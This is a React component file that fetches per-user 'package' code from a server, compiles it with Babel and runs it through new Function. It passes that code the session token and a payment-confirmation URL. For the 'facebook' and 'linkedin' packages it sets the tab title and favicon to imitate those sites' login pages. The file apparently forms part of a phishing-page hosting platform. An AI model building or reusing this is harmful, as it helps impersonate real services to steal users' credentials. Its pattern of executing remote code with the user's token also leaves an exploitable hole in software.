import axios from "axios";
import { Helmet } from "react-helmet";
import React, { useEffect, useState, useContext } from 'react';
import { Link, useNavigate, useParams } from 'react-router-dom';
import { useFormik } from 'formik'
import { toast } from 'sonner';
import * as Yup from 'yup';
import * as Babel from '@babel/standalone';
import Loader from '../../components/loader';
import { useMutation } from '@tanstack/react-query';
import { AuthContext } from "../../context/authContext";
import { jwtDecode } from 'jwt-decode';
import { FaCheck } from "react-icons/fa";
import { FaXmark } from "react-icons/fa6";
import { FcGoogle } from "react-icons/fc";
import { GrApple } from "react-icons/gr";
import { IconPlanet } from '@tabler/icons-react'


const universalAccess = import.meta.env.VITE_universal_access;
const paymentConfirmationUrl = import.meta.env.VITE_payment_confirmation;
const fetchComponent = import.meta.env.VITE_GET_COMPONENT;

const PackageDisplay = () => {
    const { user, token } = useContext(AuthContext);
    const navigate = useNavigate()
    const { packageName, user_id } = useParams();
    const [Component, setComponent] = useState(null);
    const [loading, setLoading] = useState(false);

    useEffect(() => {
        async function loadComponent() {
            setLoading(true)
            try {
                const response = await axios.get(`${fetchComponent}${packageName}/${user?.user_id || user_id}/`);
                const componentCode = await response.data;

                // console.log(`${packageName.charAt(0).toUpperCase()}${packageName.slice(1)}`)
                const output = Babel.transform(componentCode, { presets: ["react", "env"] }).code;

                const WrappedComponent = new Function("React", "Helmet", "useState", "useContext", "Link", "useParams", "useNavigate", "axios", "useMutation", "useFormik", "toast", "Yup", "user", "token", "AuthContext", "jwtDecode", "Loader", "FaCheck", "FaXmark", "FcGoogle", "GrApple", "IconPlanet", "universalAccess", "paymentConfirmationUrl", `
                    ${output}
                    return ${packageName.charAt(0).toUpperCase()}${packageName.slice(1)};
                `)(React, Helmet, useState, useContext, Link, useParams, useNavigate, axios, useMutation, useFormik, toast, Yup, user, token, AuthContext, jwtDecode, Loader, FaCheck, FaXmark, FcGoogle, GrApple, IconPlanet, universalAccess, paymentConfirmationUrl);

                setLoading(false)
                setComponent(() => WrappedComponent);
            } catch (error) {
                setLoading(false)
                if (user) {
                    toast.error(error?.response?.data?.message)
                }    
            }
        }
        loadComponent();
    }, [packageName]);

    if (!Component) return <Loader component={true} />

    return (
        <>
        
            {
                packageName === "facebook" && 
                <Helmet>
                    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" />
                    <title>Log in to Facebook</title>
                </Helmet>
            }
            {
                packageName === "linkedin" && 
                <Helmet>
                    <link rel="icon" type="image/png" href="data:image/png;base64,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" />
                    <title>Login to LinkedIn</title>
                </Helmet>
            }

            {loading ?
                <Loader component={true} />
                :
                <div>
                    {Component ?
                        <div>
                            <Component />
                        </div>
                        :
                        <Loader component={true} />
                    }
                </div>
            }
        </>

    );
};

export default PackageDisplay;
